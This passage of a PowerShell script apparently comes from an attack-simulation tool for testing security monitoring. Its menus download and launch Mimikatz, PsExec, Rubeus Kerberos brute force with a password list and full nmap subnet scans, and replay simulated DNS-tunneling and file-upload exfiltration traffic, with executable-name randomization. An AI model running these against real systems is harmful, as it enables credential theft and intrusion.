                    if ((@(Compare-Object $items $this.props.rsgsvr -SyncWindow 0).Length -ne 0) -And
                        $(AskYesNo "Do you want to save changes?")) {
                        $this.props.rsgsvr = $items
                        $this.props.Save()
                    }
                    return
                }
                $num = ParseNumber ($cmd)
                if ($num -gt 0 -And $num -le $items.Count) {
                    $items.RemoveAt($num - 1)
                    break
                }
            } while($true)
        }
    }

    hidden [void]ConfigureDefaultCortexHttpCollector() {
        while ($true) {
            Write-Host "************************************"
            Write-Host " 1) List Cortex HTTP Collector"
            Write-Host " 2) Add a Cortex HTTP Collector"
            Write-Host " 3) Delete a Cortex HTTP Collector"
            Write-Host " q) Exit"

            try {
                :retry do {
                    $cmd = Read-Host "Please choose a menu item"
                    switch ($cmd) {
                        "q" {
                            return
                        }
                        "1" {
                            $this.ListDefaultCortexHttpCollector()
                        }
                        "2" {
                            $this.AddDefaultCortexHttpCollector()
                        }
                        "3" {
                            $this.DeleteDefaultCortexHttpCollector()
                        }
                        default {
                            continue retry
                        }
                    }
                    break
                } while($true)
            } catch {
                Write-Host $_
            }
        }
    }

    hidden [void]ListDefaultCortexHttpCollector() {
        Write-Host ""
        if ($this.props.cortex_hec.Length -eq 0) {
            Write-Host "* No Default Cortex HTTP Collectors"
        } else {
            Write-Host "* Default Cortex HTTP Collectors"
            foreach ($props in $this.props.cortex_hec) {
                $raw_enabled = "disabled"
                if (![string]::IsNullOrEmpty($props.api_key_raw)) {
                    $raw_enabled = "enabled"
                }
                $cef_enabled = "disabled"
                if (![string]::IsNullOrEmpty($props.api_key_cef)) {
                    $cef_enabled = "enabled"
                }
                Write-Host "  - $($props.api_url) (raw:$raw_enabled cef:$cef_enabled compression:$($props.compression))"
            }
        }
        Write-Host ""
    }

    hidden [void]AddDefaultCortexHttpCollector() {
        Write-Host ""
        Write-Host "### Enter the Cortex HTTP Collector configuration"
        
        $props = [PropsCortexHttpCollector]::New()
        $props.api_url = ReadInput "API URL" $props.api_url @("^.+$")
        $props.api_key_raw = ReadPassword "API Key for RAW logs (Optional)" $props.api_key_raw
        $props.api_key_cef = ReadPassword "API Key for CEF logs (Optional)" $props.api_key_cef
        $props.compression = AskYesNo "Compression Mode" "y"

        if ($props -in $this.props.cortex_hec) {
            Write-Host "The Cortex HTTP Collector parameters already exist."
            return
        }
        if (AskYesNo "Do you want to add?") {
            $this.props.cortex_hec += $props
            $this.props.Save()
        }
    }

    hidden [void]DeleteDefaultCortexHttpCollector() {
        if ($this.props.cortex_hec.Length -eq 0) {
            Write-Host "* No Default Cortex HTTP Collectors"
            return
        }
        [System.Collections.ArrayList]$items = $this.props.cortex_hec

        while ($true) {
            Write-Host ""
            Write-Host "Delete a default Cortex HTTP Collector"
            Write-Host "************************************"
            for ($i=0; $i -lt $items.Count; $i++) {
                $props = $items[$i]
                $raw_enabled = "disabled"
                if (![string]::IsNullOrEmpty($props.api_key_raw)) {
                    $raw_enabled = "enabled"
                }
                $cef_enabled = "disabled"
                if (![string]::IsNullOrEmpty($props.api_key_cef)) {
                    $cef_enabled = "enabled"
                }
                Write-Host " $($i + 1)) $($props.api_url) (raw:$raw_enabled cef:$cef_enabled compression:$($props.compression))"
            }
            Write-Host " q) Exit"
            do {
                $cmd = Read-Host "Please choose a menu item"
                if ($cmd -eq "q") {
                    if ((@(Compare-Object $items $this.props.cortex_hec -SyncWindow 0).Length -ne 0) -And
                        $(AskYesNo "Do you want to save changes?")) {
                        $this.props.cortex_hec = $items
                        $this.props.Save()
                    }
                    return
                }
                $num = ParseNumber ($cmd)
                if ($num -gt 0 -And $num -le $items.Count) {
                    $items.RemoveAt($num - 1)
                    break
                }
            } while($true)
        }
    }

    hidden [void]ConfigureExecutableNameRandomization() {

        $exec_random = $this.props.exec_random
        if ([string]::IsNullOrEmpty($exec_random)) {
            $exec_random = @{}
        }
        $exec_random = $exec_random.clone()

        $keys = @("iptgen", "rsgcli")

        while ($true) {
            Write-Host ""
            Write-Host "Execution Name Randomization"
            Write-Host "************************************"
            for ($i=0; $i -lt $keys.Length; $i++) {
                $key = $keys[$i]
                $mode = "disabled"
                if (![string]::IsNullOrEmpty($exec_random.$key.mode)) {
                    $mode = $exec_random.$key.mode
                }
                Write-Host " $($i + 1)) ${key} [Current: ${mode}]"
            }
            Write-Host " q) Exit"
            do {
                $cmd = Read-Host "Please choose a menu item"
                if ($cmd -eq "q") {
                    if (AskYesNo "Do you want to save changes?") {
                        $this.props.exec_random = $exec_random
                        $this.props.Save()
                    }
                    return
                }
                $num = ParseNumber ($cmd)
                if ($num -gt 0 -And $num -le $keys.Length) {
                    $key = $keys[$num - 1]

                    if ($exec_random.$key -eq $null) {
                        $exec_random.$key = @{}
                    }
                    $exec_random[$key]["mode"] = ReadInputByChooser "Mode" `
                                                                    $null `
                                                                    @("disabled", "process", "everytime") `
                                                                    "Please type a valid mode"
                    break
                }
            } while($true)
        }
    }

    [void]Run() {
        Write-Host "Settings"
        while ($true) {
            Write-Host "************************************"
            Write-Host " 0) Cleanup the working directory"
            Write-Host " 1) Configure default syslog servers"
            Write-Host " 2) Configure default netflow servers"
            Write-Host " 3) Configure default RSG servers"
            Write-Host " 4) Configure default Cortex HTTP Collectors"
            Write-Host " 5) Configure executable name randomization"
            Write-Host " q) Exit"
            try {
                :retry do {
                    $cmd = Read-Host "Please choose a menu item"
                    switch ($cmd) {
                        "q" {
                            return
                        }
                        "0" {
                            CleanupHome $this.props.home_dir
                            Write-Host "Done."
                        }
                        "1" {
                            $this.ConfigureDefaultSyslogServer()
                        }
                        "2" {
                            $this.ConfigureDefaultNetflowServer()
                        }
                        "3" {
                            $this.ConfigureDefaultRsgServer()
                        }
                        "4" {
                            $this.ConfigureDefaultCortexHttpCollector()
                        }
                        "5" {
                            $this.ConfigureExecutableNameRandomization()
                        }
                        default {
                            continue retry
                        }
                    }
                    break
                } while($true)
            } catch {
                Write-Host $_
            }
        }
    }
}

class SetupTools : CommandBase {

    SetupTools([Properties]$props) : base($props) {
    }

    [hashtable]GetPsToolsProps() {
        $tool_dir = BuildFullPath $this.props.home_dir ".\pstools"
        $tool_exe = BuildFullPath $tool_dir "PsExec.exe"
        
        return @{
            "tool_dir" = $tool_dir
            "tool_path" = $tool_exe
            "url" = "https://github.com/spearmin10/corvette/blob/main/bin/PSTools.zip?raw=true"
        }
    }

    [string]DownloadPsTools() {
        $props = $this.GetPsToolsProps()
        if (!(IsFile $props.tool_path)) {
            DownloadAndExtractArchive $props.url $props.tool_dir
        }
        return $props.tool_dir
    }

    [hashtable]GetMimikatzProps() {
        $tool_dir = BuildFullPath $this.props.home_dir ".\mimikatz"
        $tool_exe = BuildFullPath $tool_dir "mimikatz.exe"
        
        return @{
            "tool_dir" = $tool_dir
            "tool_path" = $tool_exe
            "url" = "https://github.com/spearmin10/corvette/blob/main/bin/mimikatz.zip?raw=true"
        }
    }

    [string]DownloadMimikatz() {
        $props = $this.GetMimikatzProps()
        if (!(IsFile $props.tool_path)) {
            DownloadAndExtractArchive $props.url $props.tool_dir
        }
        return $props.tool_dir
    }

    [hashtable]GetWildFireTestPEProps() {
        $tool_dir = BuildFullPath $this.props.home_dir ".\wildfire"
        $tool_exe = BuildFullPath $tool_dir "wildfire-test-pe-file.exe"
        
        return @{
            "tool_dir" = $tool_dir
            "tool_path" = $tool_exe
            "url" = "https://wildfire.paloaltonetworks.com/publicapi/test/pe"
        }
    }

    [string]DownloadWildFireTestPE() {
        $props = $this.GetWildFireTestPEProps()
        if (!(IsFile $props.tool_path)) {
            New-Item -ItemType Directory -Force -Path $props.tool_dir
            DownloadFile $props.url $props.tool_path
        }
        return $props.tool_dir
    }

    [hashtable]GetEmbeddablePythonProps() {
        $tool_dir = BuildFullPath $this.props.home_dir ".\python-3.14.0a6"
        $tool_exe = BuildFullPath $tool_dir "python.exe"
        
        return @{
            "tool_dir" = $tool_dir
            "tool_path" = $tool_exe
            "url" = "https://github.com/spearmin10/corvette/blob/main/bin/python-3.14.0a6-embed-win32-custom.zip?raw=true"
        }
    }

    [string]DownloadEmbeddablePython() {
        $props = $this.GetEmbeddablePythonProps()
        $complete_path = BuildFullPath $props.tool_dir "python.installed"

        if (!(IsFile $props.tool_path) -Or !(IsFile $complete_path)) {
            $use_installed_pack = $true
            if ($use_installed_pack) {
                DownloadAndExtractArchive $props.url $props.tool_dir
            } else {
                $props.url = "https://www.python.org/ftp/python/3.14.0/python-3.14.0a6-embed-win32.zip"
                DownloadAndExtractArchive $props.url $props.tool_dir

                $pth_path = BuildFullPath $props.tool_dir "python314._pth"
                $content = [IO.File]::ReadAllText($pth_path)
                $content = $content -replace "#import site", "import site"
                [IO.File]::WriteAllText($pth_path, $content)

                if (!(IsFile $complete_path)) {
                    $pipexe_path = BuildFullPath $props.tool_dir "Scripts\pip.exe"
                    $getpip_path = BuildFullPath $props.tool_dir "get-pip.py"
                    
                    $url = "https://bootstrap.pypa.io/get-pip.py"
                    DownloadFile $url $getpip_path
                    
                    Start-Process -FilePath $props.tool_path `
                        -ArgumentList @($getpip_path, "--no-warn-script-location") `
                        -Wait -NoNewWindow -WorkingDirectory $props.tool_dir

                    Start-Process -FilePath $props.tool_path `
                        -ArgumentList @($pipexe_path, "install", "requests", "--no-warn-script-location") `
                        -Wait -NoNewWindow -WorkingDirectory $props.tool_dir
                    
                    [IO.File]::WriteAllText($complete_path, "")
                }
            }
        }
        return $props.tool_dir
    }

    [void]InstallPython() {
        $installer_exe = BuildFullPath $this.props.home_dir "python-3.14.0a6.exe"

        if (!(IsFile $installer_exe)) {
            $url = "https://www.python.org/ftp/python/3.14.0/python-3.14.0a6.exe"
            DownloadFile $url $installer_exe
        }
        Start-Process -FilePath $installer_exe
    }

    [void]Run() {
        Write-Host "Download/Install tools"
        while ($true) {
            Write-Host "************************************"
            Write-Host " 1) Download PsTools"
            Write-Host " 2) Download Mimikatz"
            Write-Host " 3) Download WildFire Test PE"
            Write-Host " 4) Download python (embeddable)"
            Write-Host " 5) Download/Install python"
            Write-Host " q) Exit"
            try {
                :retry do {
                    $cmd = Read-Host "Please choose a menu item"
                    switch ($cmd) {
                        "q" {
                            return
                        }
                        "1" {
                            $tool_dir = $this.DownloadPsTools()
                            Write-Host "PSTools has been installed to" $tool_dir
                        }
                        "2" {
                            $tool_dir = $this.DownloadMimikatz()
                            Write-Host "mimikatz has been installed to" $tool_dir
                        }
                        "3" {
                            $tool_dir = $this.DownloadWildFireTestPE()
                            Write-Host "WildFire Test PE file has been installed to" $tool_dir
                        }
                        "4" {
                            $tool_dir = $this.DownloadEmbeddablePython()
                            Write-Host "python has been installed to" $tool_dir
                        }
                        "5" {
                            $this.InstallPython()
                        }
                        default {
                            continue retry
                        }
                    }
                    break
                } while($true)
            } catch {
                Write-Host $_
            }
        }
    }
}

class PsExec : CommandBase {
    [string]$pstools_dir
    [string]$psexec_exe

    PsExec([Properties]$props) : base($props) {
        $this.pstools_dir = [SetupTools]::New($props).DownloadPsTools()
        $this.psexec_exe = BuildFullPath $this.pstools_dir "PsExec.exe"
    }

    [void]Run() {
        Write-Host ""
        Write-Host "### Enter the PsExec parameters"
        $hostname = ReadInput "Remote Host Name" "" @("^.+$")
        $userid = ReadInput "Remote User ID" "" @("^.+$")
        $password = ReadPassword "Remote User Password" "" @("^.*$")
        $cmdline = ReadInput "Remote Command Line" "" @("^.+$")
        $runas_et = AskYesNo "Run with the account's elevated token" "N"

        if (AskYesNo "Are you sure you want to run?") {
            $exe_dir = [IO.Path]::GetDirectoryName($this.psexec_exe)
            $exe_name = [IO.Path]::GetFileName($this.psexec_exe)

            Set-Item Env:Path $Env:Path.Replace($exe_dir + ";", "")
            $Env:Path = $exe_dir + ";" + $Env:Path

            $cargs = @(("\\" + $hostname),
                      "-accepteula",
                      "-u", $userid,
                      "-i")
            if ($runas_et) {
                $cargs += @("-h")
            }
            if (![string]::IsNullOrEmpty($password)) {
                $cargs += @("-p", $password)
            }
            $cargs += SplitCommandLine $cmdline
            StartProcess $exe_name $cargs
        }
    }
}

class PsRemoting : CommandBase {
    PsRemoting([Properties]$props) : base($props) {
    }

    [void]Run() {
        Write-Host ""
        Write-Host "### Enter the connection parameters for PsSession"
        $hostname = ReadInput "Remote Host Name" "" @("^.+$")
        $userid = ReadInput "Remote User ID" "" @("^.+$")

        if (AskYesNo "Are you sure you want to run?") {
            $q_hostname = Quote $hostname
            $q_userid = Quote $userid
            $script_configure =
@"
Write-Host ```#```#```# Start-Service -Name WinRM
Start-Service -Name WinRM
#Write-Host ```#```#```# Set-Item WSMan:\localhost\Client\TrustedHosts -Force -Value *
#Set-Item WSMan:\localhost\Client\TrustedHosts -Force -Value *
Write-Host ```#```#```# Set-Item WSMan:\localhost\Client\TrustedHosts -Force -Concatenate -Value $q_hostname
Set-Item WSMan:\localhost\Client\TrustedHosts -Force -Concatenate -Value $q_hostname
Write-Host ""
"@

            $script_pssess =
@"
`$prompt = $q_hostname, ": Enter a Password for ", $q_userid -join ""
`$passwd = Read-Host -Prompt `$prompt -AsSecureString
`$userid = $q_userid
`$cred_params = @{
    TypeName = "System.Management.Automation.PSCredential"
    ArgumentList = `$userid, `$passwd
}
`$credential = New-Object @cred_params

`$sess = New-PSSession -ComputerName $q_hostname -Credential `$credential
if (`$sess -ne `$null) {
    Enter-PSSession -Session `$sess
}
"@
            $trusted = $false
            $status = Get-Service -Name WinRM -ErrorAction SilentlyContinue
            if ($status -and $status.Status -eq "Running") {
                if (Test-Path WSMan:\localhost\Client\TrustedHosts) {
                    $trusted_hosts = (Get-Item WSMan:\localhost\Client\TrustedHosts).Value.ToLower().Split(",")
                    $trusted = $trusted_hosts -contains "*" -Or $trusted_hosts -contains $hostname.ToLower()
                }
            }
            if (!$trusted -And (AskYesNo "Do you want to configure the local PsRemoting?")) {
                $script = $script_configure, $script_pssess -join "`r`n"
                StartEncodedScript $script -no_exit $true -run_as $true
            } else {
                StartEncodedScript $script_pssess -no_exit $true
            }
            <#
            $run_configure = !$trusted -And (AskYesNo "Do you want to configure the local PsRemoting?")
            $run_as_admin = AskYesNo "Do you want to run this with admin rights?"
            if ($run_configure) {
                if ($run_as_admin) {
                    $script = $script_configure, $script_pssess -join "`r`n"
                    StartEncodedScript $script -no_exit $true -run_as $true
                } else {
                    StartEncodedScript $script_configure -wait $true -run_as $true
                    StartEncodedScript $script_pssess -no_exit $true
                }
            } else {
                if ($run_as_admin) {
                    StartEncodedScript $script_pssess -no_exit $true -run_as $true
                } else {
                    StartEncodedScript $script_pssess -no_exit $true
                }
            }
            #>
        }
    }
}

class RemoteAccess : CommandBase {
    RemoteAccess([Properties]$props) : base($props) {
    }

    [void]Run() {
        while ($true) {
            Write-Host "************************************"
            Write-Host " 1) Run PsExec"
            Write-Host " 2) Create PsSession"
            Write-Host " q) Exit"

            try {
                :retry do {
                    $cmd = Read-Host "Please choose a menu item to run"
                    switch($cmd) {
                        "1" {
                            [PsExec]::New($this.props).Run()
                        }
                        "2" {
                            [PsRemoting]::New($this.props).Run()
                        }
                        "q" {
                            return
                        }
                        default {
                            continue retry
                        }
                    }
                    break
                } while($true)
            } catch {
                Write-Host $_
            }
        }
    }
}

class Mimikatz : CommandBase {
    [string]$mimikatz_dir
    [string]$mimikatz_exe

    Mimikatz([Properties]$props) : base($props) {
        $this.mimikatz_dir = [SetupTools]::New($props).DownloadMimikatz()
        $this.mimikatz_exe = BuildFullPath $this.mimikatz_dir "mimikatz.exe"
    }

    [void]Run([bool]$run_as) {
        $exe_dir = [IO.Path]::GetDirectoryName($this.mimikatz_exe)
        $exe_name = [IO.Path]::GetFileName($this.mimikatz_exe)

        Set-Item Env:Path $Env:Path.Replace($exe_dir + ";", "")
        $Env:Path = $exe_dir + ";" + $Env:Path

        if ($run_as) {
            Start-Process -FilePath $exe_name -WorkingDirectory $this.props.home_dir -verb runas
        } else {
            Start-Process -FilePath $exe_name -WorkingDirectory $this.props.home_dir
        }
    }
}

class KerberosBruteForce : CommandBase {
    [string]$rubeus_dir
    [string]$rubeus_exe
    [string]$passwords_file

    KerberosBruteForce([Properties]$props) : base($props) {
        $this.rubeus_dir = BuildFullPath $props.home_dir ".\rubeus"
        $this.rubeus_exe = BuildFullPath $this.rubeus_dir "rubeus.exe"
        $this.passwords_file = BuildFullPath $this.rubeus_dir "passwords.txt"

        if (!(IsFile $this.rubeus_exe)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/rubeus.zip?raw=true"
            DownloadAndExtractArchive $url $this.rubeus_dir
        }
        if (!(IsFile $this.passwords_file)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/passwords.zip?raw=true"
            DownloadAndExtractArchive $url $this.rubeus_dir
        }
    }

    [void]Run() {
        $exe_dir = [IO.Path]::GetDirectoryName($this.rubeus_exe)
        $exe_name = [IO.Path]::GetFileName($this.rubeus_exe)

        Set-Item Env:Path $Env:Path.Replace($exe_dir + ";", "")
        $Env:Path = $exe_dir + ";" + $Env:Path

        $cargs = @("brute", "/passwords:$($this.passwords_file)", "/noticket")
        StartProcess $exe_name $cargs
    }
}

class WildFireTestPE : CommandBase {
    [string]$wildfire_dir
    [string]$wildfire_exe

    WildFireTestPE([Properties]$props) : base($props) {
        $this.wildfire_dir = BuildFullPath $props.home_dir ".\wildfire"
        $this.wildfire_exe = BuildFullPath $this.wildfire_dir "wildfire-test-pe-file.exe"

        if (!(IsFile $this.wildfire_exe)) {
            New-Item -ItemType Directory -Force -Path $this.wildfire_dir

            $url = "https://wildfire.paloaltonetworks.com/publicapi/test/pe"
            DownloadFile $url $this.wildfire_exe
        }
    }

    [void]Run() {
        $exe_dir = [IO.Path]::GetDirectoryName($this.wildfire_exe)
        $exe_name = [IO.Path]::GetFileName($this.wildfire_exe)

        Set-Item Env:Path $Env:Path.Replace($exe_dir + ";", "")
        $Env:Path = $exe_dir + ";" + $Env:Path
        
        StartProcess $exe_name
    }
}

class NmapBase : CommandBase {
    [string]$nmap_dir
    [string]$nmap_exe

    NmapBase([Properties]$props) : base($props) {
        $this.nmap_dir = BuildFullPath $props.home_dir ".\nmap"
        $this.nmap_exe = BuildFullPath $this.nmap_dir "nmap.exe"

        if (!(IsFile $this.nmap_exe)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/nmap-7.92.zip?raw=true"
            DownloadAndExtractArchive $url $this.nmap_dir
        }
        if (!(IsFile $env:WINDIR\system32\Npcap\wpcap.dll)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/npcap-1.72.exe?raw=true"
            $path = DownloadFile $url (BuildFullPath $props.home_dir ".\npcap-1.72.exe")
            Start-Process -FilePath $path -Wait
        }
    }
}

class IptgenBase : CommandBase {
    [string]$iptgen_dir
    [string]$iptgen_bin
    [string]$iptgen_exe
    [string]$iptgen_exename

    IptgenBase([Properties]$props) : base($props) {
        $iptgen_ver = "0.15.0"
        $this.iptgen_exename = "iptgen.exe"
        $this.iptgen_dir = BuildFullPath $props.home_dir ".\iptgen-${iptgen_ver}"
        $this.iptgen_bin = BuildFullPath $this.iptgen_dir ".\bin"
        $this.iptgen_exe = BuildFullPath $this.iptgen_bin $this.iptgen_exename

        if (!(IsFile $this.iptgen_exe)) {
            $url = "https://github.com/spearmin10/iptgen/releases/download/${iptgen_ver}/iptgen.win32.zip"
            DownloadAndExtractArchive $url $this.iptgen_dir
        }
        if (!(IsFile $env:WINDIR\system32\Npcap\wpcap.dll)) {
            $url = "https://github.com/spearmin10/corvette/blob/main/bin/npcap-1.72.exe?raw=true"
            $path = DownloadFile $url (BuildFullPath $props.home_dir ".\npcap-1.72.exe")
            Start-Process -FilePath $path -Wait
        }
    }

    [Microsoft.Management.Infrastructure.CimInstance]SelectInterface() {
        [array]$interfaces = Get-NetIPAddress -AddressFamily IPV4 -SuffixOrigin @("Dhcp", "Manual") `
                           | Sort-Object -Property InterfaceAlias
        if ($interfaces.Length -eq 0) {
            Write-Host "No network interfaces were found."
            return $null
        } elseif ($interfaces.Length -eq 1) {
            return $interfaces[0]
        }
        Write-Host ""
        Write-Host "************************************"
        for ($i = 0; $i -lt $interfaces.Length; $i++) {
            Write-Host " $($i+1)) $($interfaces[$i].InterfaceAlias)"
        }
        Write-Host " q) [Exit Menu]"

        while ($true) {
            $item = ReadInput "Select an interface to replay packets"
            if ($item -eq "q") {
                break
            }
            $num = ParseNumber $item
            if ($num -gt 0 -And $num -le $interfaces.Length) {
                return $interfaces[$num - 1]
            }
        }
        return $null
    }

    [void]Run([string]$interface, [string]$iptgen_json, [int]$response_interval) {
        $epilogue_script = ""
        $exe_path = ChangeExecutableName $this.props.exec_random "iptgen" $this.iptgen_exe
        if ([string]::IsNullOrEmpty($exe_path)) {
            $exe_path = $this.iptgen_exe
        } elseif (!(IsFile $exe_path)) {
            <#
            New-Item -ItemType HardLink -Path $exe_path -Value $this.iptgen_exe
            #>
            Copy-Item -Destination $exe_path -Path $this.iptgen_exe
            $epilogue_script = "Remove-Item $exe_path -Force"
        }
        $exe_dir = [IO.Path]::GetDirectoryName($exe_path)
        $exe_name = [IO.Path]::GetFileName($exe_path)

        Set-Item Env:Path $Env:Path.Replace($exe_dir + ";", "")
        $Env:Path = $exe_dir + ";" + $Env:Path

        $cargs = @("--in.file", $iptgen_json, "--out.eth", $interface)
        if ($response_interval -ne 0) {
            $cargs += @("--response.interval", [string]$response_interval)
        }
        StartProcess $exe_name $cargs $this.props.home_dir $epilogue_script
    }
}

class RsgcliBase : CommandBase {
    [string]$rsgcli_dir
    [string]$rsgcli_bin
    [string]$rsgcli_exe
    [string]$rsgcli_exename

    RsgcliBase([Properties]$props) : base($props) {
        $rsgcli_ver = "0.5.0"
        $this.rsgcli_exename = "rsgcli.exe"
        $this.rsgcli_dir = BuildFullPath $props.home_dir ".\rsgcli-${rsgcli_ver}"
        $this.rsgcli_bin = BuildFullPath $this.rsgcli_dir ".\bin"
        $this.rsgcli_exe = BuildFullPath $this.rsgcli_bin $this.rsgcli_exename

        if (!(IsFile $this.rsgcli_exe)) {
            $url = "https://github.com/spearmin10/rsgen/releases/download/${rsgcli_ver}/rsgcli.win32.zip"
            DownloadAndExtractArchive $url $this.rsgcli_dir
        }
    }

    [void]Run([string]$rsgsvr_host, [int]$rsgsvr_port, [string]$rsgcli_json) {
        $epilogue_script = ""
        $exe_path = ChangeExecutableName $this.props.exec_random "rsgcli" $this.rsgcli_exe
        if ([string]::IsNullOrEmpty($exe_path)) {
            $exe_path = $this.rsgcli_exe
        } elseif (!(IsFile $exe_path)) {
            <#
            New-Item -ItemType HardLink -Path $exe_path -Value $this.rsgcli_exe
            #>
            Copy-Item -Destination $exe_path -Path $this.rsgcli_exe
            $epilogue_script = "Remove-Item $exe_path -Force"
        }
        $exe_dir = [IO.Path]::GetDirectoryName($exe_path)
        $exe_name = [IO.Path]::GetFileName($exe_path)

        Set-Item Env:Path $Env:Path.Replace($exe_dir + ";", "")
        $Env:Path = $exe_dir + ";" + $Env:Path

        $cargs = @("--in.file", $rsgcli_json,
                   "--mgmt.host", $rsgsvr_host,
                   "--mgmt.port", [string]$rsgsvr_port)
        StartProcess $exe_name $cargs $this.props.home_dir $epilogue_script
    }
}

class NmapPortScan : NmapBase {

    NmapPortScan([Properties]$props) : base($props) {
    }

    [void]Run() {
        $exe_dir = [IO.Path]::GetDirectoryName($this.nmap_exe)
        $exe_name = [IO.Path]::GetFileName($this.nmap_exe)

        Set-Item Env:Path $Env:Path.Replace($exe_dir + ";", "")
        $Env:Path = $exe_dir + ";" + $Env:Path

        [array]$subnet_list = Get-NetIPAddress -AddressFamily IPV4 -SuffixOrigin @("Dhcp", "Manual") `
                            | select IPAddress, PrefixLength `
                            | % { $_.IPAddress + '/' + $_.PrefixLength }
        foreach ($subnet in $subnet_list) {
            Write-Host ""
            Write-Host "Starting a port scan: $subnet"

            $cargs = @("-p", "1-65535", $subnet)
            StartProcess $exe_name $cargs $this.props.home_dir
        }
    }
}

class NmapMenu : CommandBase {
    NmapMenu([Properties]$props) : base($props) {
    }

    [void]Run() {
        while ($true) {
            Write-Host "************************************"
            Write-Host " 1) Port Scan"
            Write-Host " q) Exit"
            try {
                :retry do {
                    $cmd = Read-Host "Please choose a menu item to run"
                    switch($cmd) {
                        "1" {
                            [NmapPortScan]::New($this.props).Run()
                        }
                        "q" {
                            return
                        }
                        default {
                            continue retry
                        }
                    }
                    break
                } while($true)
            } catch {
                Write-Host $_
            }
        }
    }
}

class IptgenDnsTunneling : IptgenBase {
    [string]$iptgen_json

    IptgenDnsTunneling([Properties]$props) : base ($props) {
        $file_name = "iptgen-dns-tunneling-template.json"
        $this.iptgen_json = BuildFullPath $this.iptgen_dir ".\$($file_name)"

        if (!(IsFile $this.iptgen_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.iptgen_json
        }
    }

    [void]Run() {
        $interface = $this.SelectInterface()
        if ([string]::IsNullOrEmpty($interface)) {
            return
        }
        Write-Host ""
        Write-Host "### Enter the DNS tunneling configuration"
        $client_ip = ReadInput "DNS client IP" `
                               $interface.IPAddress `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $server_ip = ReadInput "DNS server IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $domain = ReadInput "DNS tunnel domain" $null @("^.+$")

        $Env:client_ip = $client_ip
        $Env:server_ip = $server_ip
        $Env:domain = $domain
        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($interface.InterfaceAlias, $this.iptgen_json, 10)
        }
    }
}

class IptgenDnsRandomQuery : IptgenBase {
    [string]$iptgen_json

    IptgenDnsRandomQuery([Properties]$props) : base ($props) {
        $file_name = "iptgen-dns-random-failed-query-template.json"
        $this.iptgen_json = BuildFullPath $this.iptgen_dir ".\$($file_name)"

        if (!(IsFile $this.iptgen_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.iptgen_json
        }
    }

    [void]Run() {
        $interface = $this.SelectInterface()
        if ([string]::IsNullOrEmpty($interface)) {
            return
        }
        Write-Host ""
        Write-Host "### Enter the DNS random query configuration"
        $client_ip = ReadInput "DNS client IP" `
                               $interface.IPAddress `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $server_ip = ReadInput "DNS server IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"

        $Env:client_ip = $client_ip
        $Env:server_ip = $server_ip
        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($interface.InterfaceAlias, $this.iptgen_json, 10)
        }
    }
}

class IptgenSmtpFileUpload : IptgenBase {
    [string]$iptgen_json

    IptgenSmtpFileUpload([Properties]$props) : base ($props) {
        $file_name = "iptgen-smtp-upload-template.json"
        $this.iptgen_json = BuildFullPath $this.iptgen_dir ".\$($file_name)"

        if (!(IsFile $this.iptgen_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.iptgen_json
        }
    }

    [void]Run() {
        $interface = $this.SelectInterface()
        if ([string]::IsNullOrEmpty($interface)) {
            return
        }
        Write-Host ""
        Write-Host "### Enter the SMTP upload configuration"
        $client_ip = ReadInput "Client IP" `
                               $interface.IPAddress `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $server_ip = ReadInput "Server IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $upload_filename = ReadInput "Upload file name" "test.dat" @("^.+$")
        $upload_filesize = ReadInputSize "Upload file size" "20MB" "Invalid file size. Please retype the size."
        $repeat_count = ParseNumber(ReadInput "Number of times to repeat" `
                                              "1" `
                                              @("^[0-9]+$") `
                                              "Please retype a valid number")

        $Env:client_ip = $client_ip
        $Env:server_ip = $server_ip
        $Env:upload_filename = $upload_filename
        $Env:upload_filesize = $upload_filesize
        $Env:repeat_count = $repeat_count
        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($interface.InterfaceAlias, $this.iptgen_json, 10)
        }
    }
}

class IptgenFtpFileUpload : IptgenBase {
    [string]$iptgen_json

    IptgenFtpFileUpload([Properties]$props) : base ($props) {
        $file_name = "iptgen-ftp-upload-passive-template.json"
        $this.iptgen_json = BuildFullPath $this.iptgen_dir ".\$($file_name)"

        if (!(IsFile $this.iptgen_json)) {
            $url = "https://raw.githubusercontent.com/spearmin10/corvette/main/data/$($file_name)"
            DownloadFile $url $this.iptgen_json
        }
    }

    [void]Run() {
        $interface = $this.SelectInterface()
        if ([string]::IsNullOrEmpty($interface)) {
            return
        }
        Write-Host ""
        Write-Host "### Enter the FTP file upload configuration"
        $client_ip = ReadInput "Client IP" `
                               $interface.IPAddress `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $server_ip = ReadInput "Server IP" `
                               "" `
                               @($script:PATTERN_IPV4_ADDR) `
                               "Please retype a valid IPv4 address"
        $upload_filename = ReadInput "Upload file name" "test.dat" @("^.+$")
        $upload_filesize = ReadInputSize "Upload file size" "100MB" "Invalid file size. Please retype the size."
        $repeat_count = ParseNumber(ReadInput "Number of times to repeat" `
                                              "1" `
                                              @("^[0-9]+$") `
                                              "Please retype a valid number")

        $Env:client_ip = $client_ip
        $Env:server_ip = $server_ip
        $Env:upload_filename = $upload_filename
        $Env:upload_filesize = $upload_filesize
        $Env:repeat_count = $repeat_count
        if (AskYesNo "Are you sure you want to run?") {
            $this.Run($interface.InterfaceAlias, $this.iptgen_json, 10)
        }
    }
}

class IptgenHttpFileUpload : IptgenBase {
    [string]$iptgen_json
    [bool]$https

